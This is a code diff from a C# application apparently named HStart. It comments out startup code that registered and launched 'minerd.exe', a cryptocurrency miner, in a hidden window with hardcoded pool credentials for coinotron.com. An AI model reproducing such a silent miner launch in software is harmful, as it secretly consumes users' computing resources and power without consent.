@@ -23,20 +23,20 @@ namespace HStart.UI
 
             StartProcInfoSection spiSection = StartProcInfoSection.CreateSection();
 
-            StartProcInfoElement spiElement = new StartProcInfoElement() { 
-                Key = "minerd-coinotron",
-                CreateNoWindow = false,
-                FileName = "minerd.exe",
-                Arguments = @"-q --userpass=Cameleer.1:helicopter --url=http://coinotron.com:8322 --algo=scrypt --threads=2 --scantime=6 --retry-pause=10",
-                WindowStyle = ProcessWindowStyle.Hidden
-            };
+            //StartProcInfoElement spiElement = new StartProcInfoElement() { 
+            //    Key = "minerd-coinotron",
+            //    CreateNoWindow = false,
+            //    FileName = "minerd.exe",
+            //    Arguments = @"-q --userpass=Cameleer.1:helicopter --url=http://coinotron.com:8322 --algo=scrypt --threads=2 --scantime=6 --retry-pause=10",
+            //    WindowStyle = ProcessWindowStyle.Minimized
+            //};
 
-            if (spiSection.StartProcInfos[spiElement.Key] == null)
-            {
-                spiSection.StartProcInfos.Add(spiElement);
-            }
+            //if (spiSection.StartProcInfos[spiElement.Key] == null)
+            //{
+            //    spiSection.StartProcInfos.Add(spiElement);
+            //}
 
-            spiSection.Save();
+            //spiSection.Save();
 
             Application.Run(new MainForm());
         }
